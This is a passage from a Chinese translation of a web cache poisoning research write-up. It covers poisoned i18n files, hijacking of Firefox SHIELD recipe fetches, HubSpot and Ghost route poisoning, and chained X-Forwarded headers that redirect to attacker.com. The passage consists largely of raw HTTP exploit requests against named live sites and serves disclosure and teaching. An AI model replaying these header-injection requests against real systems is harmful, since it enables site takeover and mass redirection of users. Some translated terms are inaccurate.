    GET /api/i18n/en HTTP/1.1
    Host: id.burpcollaborator.net
该路径表明，在网站的某个地方，有一些JavaScript代码使用data-site-root属性来决定从哪里加载一些国际数据。我试图通过获取
来找出这些数据应该是什么样的，但只是收到了一个空的JSON响应。幸运的是，将'en'改为'es'拿到了一个线索：
    GET /api/i18n/es HTTP/1.1
    Host: catalog.data.gov
    HTTP/1.1 200 OK
    …
    {"Show more":"Mostrar más"}
该文件包含用于将短语翻译为用户所选语言的地图。通过创建我们自己的翻译文件并使缓存投毒，我们可以将短语翻译变成漏洞：
    GET  /api/i18n/en HTTP/1.1
    Host: portswigger-labs.net
    HTTP/1.1 200 OK
    ...
    {"Show more":""}
最终的结果，任何查看包含“显示更多”文字的网页的人都会被利用。
### 劫持Mozilla SHIELD(Hijacking Mozilla SHIELD)
我配置的“X-Forwarded-Host”匹配/替换规则可帮助解决上一个漏洞，而且产生意想不到的效果。除了与catalog.data.gov的交互之外，我还收到了一些非常神秘的内容：
    GET /api/v1/recipe/signed/ HTTP/1.1
    Host: xyz.burpcollaborator.net
    User-Agent: Mozilla/5.0 … Firefox/57.0
    Accept: application/json
    origin: null
    X-Forwarded-Host: xyz.burpcollaborator.net
[Origin:null 相当罕见](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)之前，我从来没有见过一个浏览器的问题完全小写`Origin`
协议头。通过筛选代理的历史记录，发现罪魁祸首是Firefox本身。Firefox曾试图获取一份“recipes”列表，作为[SHIELD](https://wiki.mozilla.org/Firefox/Shield)系统的一部分，用于静默安装扩展以用于营销和研究目的。该系统可能因强行分发“Mr
Robot”扩展而闻名，引起了[消费者的强烈反对](https://www.cnet.com/news/mozilla-backpedals-after-mr-robot-firefox-misstep/)。
无论如何，看起来X-Forwarded-Host协议头欺骗了这个系统，将Firefox引导到我自己的网站以获取`recipes`：
    GET /api/v1/ HTTP/1.1
    Host: normandy.cdn.mozilla.net
    X-Forwarded-Host: xyz.burpcollaborator.net
    HTTP/1.1 200 OK
    {
      "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
      "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
      "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
      "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
       …
    }
`Recipes`看起来像：
    [{
      "id": 403,
      "last_updated": "2017-12-15T02:05:13.006390Z",
      "name": "Looking Glass (take 2)",
      "action": "opt-out-study",
      "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
      "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
      "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
    }]
该系统使用NGINX进行缓存，并很乐意地保存我的投毒响应并将其提供给其他用户。Firefox在浏览器打开后不久就会抓取此URL并定期重新获取它，最终意味着数千万Firefox日常用户都可能从我的网站上检索`recipes`。
这提供了很多可能性。Firefox使用的`recipes`有[签名](https://github.com/mozilla-services/autograph/tree/master/signer/contentsignature)，所以我不能通过只安装恶意插件来使代码执行，但我可以使数千万真正的用户访问我构造的URL。显而易见，这可以作为DDoS使用。如果与适当的内存破坏漏洞相结合，这将是非常严重的。此外，一些后端Mozilla系统使用无符号`recipes`，这可能用于在其基础设施内部获得立足点并可能获得`recipes`签名密钥。此外，我可以重做之前选择的`recipes`，这可能会大规模强制用户安装一个已知漏洞的扩展，或导致`Mr
Robot`意外返回。
我向Mozilla报告了这一点，他们在24小时内修补了他们的基础设施，但是对于严重程度存在一些分歧，因此只获得了1000美元的奖励。
### 路由投毒(Route poisoning)
有些应用程序不仅愚蠢地使用协议头生成URL，而且无知地将它们用于内部的请求路由：
    GET / HTTP/1.1
    Host: www.goodhire.com
    X-Forwarded-Server: canary
    HTTP/1.1 404 Not Found
    CF-Cache-Status: MISS
    …
    HubSpot - Page not found
    The domain canary does not exist in our system.
Goodhire.com显然托管在HubSpot上，而HubSpot给予X-Forwarded-Server比主机优先级高的请求头，并使请求的目标客户端感到困惑。虽然我们的输入反映在页面中，但它是HTML编码的，所以直接的XSS攻击在这里不起作用。要利用这一点，我们需要转到hubspot.com，将自己注册为HubSpot客户端，在HubSpot页面上放置一个有效Payload，然后欺骗HubSpot在goodhire.com上发送此响应：
    GET / HTTP/1.1
    Host: www.goodhire.com
    X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
    HTTP/1.1 200 OK
    …
Cloudflare愉快地缓存了此响应，并将其提供给后续访问者。在将此报告传递给HubSpot后，HubSpot通过永久封禁我的IP地址来解决这个问题。经过一番劝说，他们最终修补了漏洞。
像这样的内部错误路由漏洞在SaaS应用程序中特别常见，在这些应用程序中，单个系统处理针对许多不同客户的请求。
### 隐蔽的路由投毒（Hidden Route Poisoning）
路由投毒漏洞并不总是那么明显：
    GET / HTTP/1.1
    Host: blog.cloudflare.com
    X-Forwarded-Host: canary
    HTTP/1.1 302 Found
    Location: https://ghost.org/fail/
Cloudflare的博客由Ghost托管，显然他们正在使用X-Forwarded-Host协议头。您可以通过指定另一个可识别的主机名（例如blog.binary.com）来避免重定向“失败”，但这只会导致奇怪的10秒延迟，然后是标准的blog.cloudflare.com响应。乍一看，并没有明确的方法来利用这一点。
当用户首次使用Ghost注册博客时，它会在ghost.io下使用唯一的子域发布它们。一旦博客启动并运行，用户就可以定义像blog.cloudflare.com这样的任意自定义域。如果用户定义了自定义域，则其ghost.io子域将只重定向到它：
    GET / HTTP/1.1
    Host: noshandnibble.ghost.io
    HTTP/1.1 302 Found
    Location: http://noshandnibble.blog/
至关重要的是，也可以使用X-Forwarded-Host协议头触发此重定向：
    GET / HTTP/1.1
    Host: blog.cloudflare.com
    X-Forwarded-Host: noshandnibble.ghost.io
    HTTP/1.1 302 Found
    Location: http://noshandnibble.blog/
通过注册我的ghost.org帐户并设置自定义域名，我可以将发送到blog.cloudflare.com的请求重定向到我自己的网站：[waf.party](https://waf.party/)。这意味着我可以劫持类似图像资源的加载：  
重定向JavaScript加载以获得对blog.cloudflare.com的完全控制的逻辑步骤被一个问题阻挠 -如果你仔细观察重定向，你会看到它使用HTTP但博客是通过HTTPS加载的。这意味着浏览器的混合内容保护启动并阻止`script/stylesheet`重定向。
我找不到任何技术方法让Ghost发出HTTPS重定向，因此很想放弃我的顾虑并向Ghost报告使用HTTP而不是HTTPS作为漏洞的，希望他们能为我修复它。最终，我决定通过将问题放上[hackxor](https://hackxor.net/mission?id=7)并附上现金奖励来众筹解决方案。第一个解决方案是Sajjad
Hashemian发现的，他发现在Safari中如果waf.party在浏览器的HSTS缓存中，重定向将自动升级到HTTPS而不是被阻止。根据[Manuel
Caballero的工作](https://www.brokenbrowser.com/loading-insecure-content-in-secure-pages/)，[Sam Thomas](https://twitter.com/_s_n_t)跟进了Edge的解决方案-发布302重定向到HTTPS URL，完全绕过了Edge的混合内容保护。
总而言之，对于Safari和Edge用户，我可以完全控制blog.cloudflare.com，blog.binary.com和其他所有ghost.org客户端上的每个页面。对于Chrome/Firefox用户，我只能劫持图像。虽然我使用Cloudflare作为上面的截图，因为这是第三方系统中的一个问题，我选择通过Binary报告它，因为他们的bug赏金计划支付现金，不像Cloudflare。
### 链接未加密的输入（Chaining Unkeyed Inputs）
有时，未加密的输入只会混淆应用程序堆栈的一部分，并且您需要链接其他未加密的输入以实现可利用的结果。以以下网站为例：
    GET /en HTTP/1.1
    Host: redacted.net
    X-Forwarded-Host: xyz
    HTTP/1.1 200 OK
    Set-Cookie: locale=en; domain=xyz
X-Forwarded-Host协议头覆盖到cookie上的域，但在响应的其余部分中没有生成任何URL。这本身就没用了。但是，还有另一个未加密的输入：
    GET /en HTTP/1.1
    Host: redacted.net
    X-Forwarded-Scheme: nothttps
    HTTP/1.1 301 Moved Permanently
    Location: https://redacted.net/en
此输入本身也是无用的，但如果我们将两者结合在一起，我们可以将响应转换为重定向到任意网址：
    GET /en HTTP/1.1
    Host: redacted.net
    X-Forwarded-Host: attacker.com
    X-Forwarded-Scheme: nothttps
    HTTP/1.1 301 Moved Permanently
    Location: https://attacker.com/en
使用此技术，可以通过从自定义HTTP请求头中重定向POST请求来窃取CSRF